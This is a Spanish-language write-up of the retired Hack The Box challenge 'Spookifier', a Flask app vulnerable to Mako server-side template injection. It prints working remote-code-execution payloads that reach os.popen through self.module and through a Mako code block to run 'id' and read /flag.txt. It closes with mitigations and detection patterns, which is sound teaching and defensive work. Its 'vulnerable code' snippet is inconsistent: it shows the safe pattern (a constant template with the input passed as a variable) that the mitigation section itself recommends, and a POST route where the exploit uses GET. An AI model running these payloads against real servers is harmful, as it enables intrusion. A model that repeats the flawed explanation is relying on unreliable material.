---
challenge: Spookifier
type: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, flask, mako, ssti, rce]
---

# Spookifier — Hack The Box

[⚑ English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Convertidor de texto con «estilos» que renderiza la entrada con **Mako**, el motor de plantillas de Python basado en `${}`. No hace falta cadena de globals: `self` está expuesto y desde ahí se llega a `os` en una línea. El reto **entrega el código** (`spookifier.zip`: `main.py`, `routes.py`, `util.py`), así que el vector se lee, no se adivina.

## Enunciado y superficie

Un campo de texto y varios botones de estilo. Al enviar, el texto aparece «decorado»; el nombre del parámetro y el HTML sugieren plantillas del lado servidor.

## Reconocimiento

El paquete incluye el código de la aplicación y un `flag.txt` **de prueba**: el flag válido se lee del servidor, no del ZIP. `Dockerfile` expone el servicio en **1337** y el parámetro de entrada se llama `text` (`/?text=...`).

## Análisis del código

En `util.py`, `spookify()` pasa el texto por cuatro «fuentes» y `generate_render()` mete el resultado en un `Template(...)` de **Mako**. La cuarta fuente conserva los caracteres ASCII —incluidos `<`, `%` y `>`—, así que el payload entra por esa columna.

```python
from mako.template import Template

def generate_render(converted_fonts):
    result = "<tr>" + "".join(converted_fonts) + "</tr>"   # font4 = ASCII
    return Template(result).render()
```

`render()` sin contexto evalúa `${...}` como **expresión Python**.

## Explicación del fallo

```python
from mako.template import Template

@app.route("/", methods=["POST"])
def index():
    text = request.form.get("text")
    return Template("${text}").render(text=text)
```

Mako evalua `${...}` como **expresión Python**, no como variable de plantilla. Comprobar:

```text
${7*7}      -> 49
${7*'7'}    -> 7777777
```

## Reproducción local

Se puede levantar el propio `spookifier.zip` en Docker y atacar `127.0.0.1:1337`; el `flag.txt` incluido es un señuelo, así que la prueba válida es la ejecución de un comando (`id`), no leer ese fichero.

## Explotación

Confirmar el motor y ejecutar:

```text
/?text=${7*7}                                    -> 49
/?text=${"z".join("ab")}                         -> azb
/?text=${self.module.cache.util.os.popen('id').read()}
```

`os.system()` devuelve sólo el código de salida (`0`), así que no sirve para leer: hay que usar `popen(...).read()`. Para el flag:

```text
/?text=${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

Alternativa con bloque de código Mako, sin `self`:

```text
/?text=<% import os; context.write(os.popen('cat /flag.txt').read()) %>
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`${}` y no `{{ }}`**: Mako no comparte sintaxis con Jinja2; probar ambos y mirar cuál evalúa.
- **Contexto `self`**: la ruta exacta (`module.cache.util`) depende de la versión de Mako; si falla, volcar `self` con `${self}` y seguir el árbol.
- **Doble render**: si la salida se escapa, `str()` alrededor del `popen` no cambia nada; el problema suele ser el `Content-Type`.

- Mako evalúa expresiones, así que un `${text}` con entrada del usuario es RCE directo.
- `self.module` es el atajo clásico a `os` en Mako, equivalente a `config`/`cycler` en Jinja2.
- Mitigación: no construir plantillas con entrada; usar `Template(...).render(text=text)` con `${text}` en el fichero, no en una cadena dinámica.

## Mitigaciones y detección

- No construir plantillas con entrada del usuario: `Template(...)` sobre datos externos es ejecución de código por diseño.
- Si hay que renderizar texto, pasarlo como **variable** (`render(text=text)`), nunca concatenarlo en la plantilla.
- Escapar la salida y validar el texto contra un allowlist de caracteres esperados.
- Detección: peticiones con `${`, `<%` o `%>` en parámetros, y procesos web que abren shells o leen `/flag.txt`.

## Referencias

- [ssti](../../knowledge/web/ssti.md)
